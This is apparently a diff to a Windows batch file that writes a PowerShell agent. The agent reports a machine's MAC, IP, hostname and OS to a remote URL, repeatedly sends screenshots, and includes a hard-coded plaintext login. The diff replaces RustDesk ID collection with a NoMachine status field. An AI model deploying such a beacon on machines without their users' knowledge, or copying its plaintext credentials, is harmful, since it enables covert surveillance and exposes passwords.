@@ -1077,20 +1077,11 @@ echo $mac = if ^($nic^) { $nic.MACAddress } else { '' }
 echo $ip = ^(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue ^| Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} ^| Select-Object -First 1^).IPAddress
 echo $hostname = $env:COMPUTERNAME
 echo if ^($hostname -like 'PCLPCL*'^) { $hostname = 'PCL' + $hostname.Substring^(6^) }
-echo $rd_id = ''
-echo $paths = @("$env:ProgramFiles\RustDesk\config\RustDesk.toml", "$env:ProgramData\RustDesk\config\RustDesk.toml", "$env:LOCALAPPDATA\RustDesk\config\RustDesk.toml", "C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Windows\System32\config\systemprofile\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Users\Public\RustDesk\config\RustDesk.toml")
-echo foreach^($p in $paths^) {
-echo     if^(Test-Path $p^) {
-echo         $raw = Get-Content $p -Raw
-echo         $m = $raw -match "id\s*=\s*['""]?(\d+)['""]?"
-echo         if^($m^) { $rd_id = $Matches[1].Trim^(^); break }
-echo     }
-echo }
 echo $body = @{
 echo     mac = $mac
 echo     hostname = $hostname
 echo     ip = $ip
-echo     rustdesk = $rd_id
+echo     nomachine = 'READY'
 echo     user = 'PCL'
 echo     password = 'PCL@1231233'
 echo     os = ^(Get-CimInstance Win32_OperatingSystem^).Caption
@@ -1122,16 +1113,6 @@ echo if ^($hostname -like 'PCLPCL*'^) { $hostname = 'PCL' + $hostname.Substring^
 echo while ^($true^) {
 echo $ip = ^(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue ^| Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} ^| Select-Object -First 1^).IPAddress
 echo 
-echo $rd_id = ''
-echo $paths = @("$env:ProgramFiles\RustDesk\config\RustDesk.toml", "$env:ProgramData\RustDesk\config\RustDesk.toml", "$env:LOCALAPPDATA\RustDesk\config\RustDesk.toml", "C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Windows\System32\config\systemprofile\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Users\Public\RustDesk\config\RustDesk.toml")
-echo foreach^($p in $paths^) {
-echo     if^(Test-Path $p^) {
-echo         $raw = Get-Content $p -Raw
-echo         $m = $raw -match "id\s*=\s*['""]?(\d+)['""]?"
-echo         if^($m^) { $rd_id = $Matches[1].Trim^(^); break }
-echo     }
-echo }
-echo 
 echo $screenshot = ''
 echo try {
 echo     Add-Type -AssemblyName System.Windows.Forms
@@ -1153,7 +1134,7 @@ echo     $jpegParams.Dispose^(^); $g2.Dispose^(^); $thumb.Dispose^(^); $gfx.Disp
 echo } catch {}
 echo 
 echo $os = ^(Get-CimInstance Win32_OperatingSystem^).Caption
-echo $body = @{ hostname = $hostname; ip = $ip; rustdesk = $rd_id; screenshot = $screenshot; os = $os; user = 'PCL'; password = 'PCL@1231233' } ^| ConvertTo-Json -Depth 3
+echo $body = @{ hostname = $hostname; ip = $ip; nomachine = 'READY'; screenshot = $screenshot; os = $os; user = 'PCL'; password = 'PCL@1231233' } ^| ConvertTo-Json -Depth 3
 echo try {
 echo     Invoke-RestMethod -Uri $url -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 ^| Out-Null
 echo } catch {
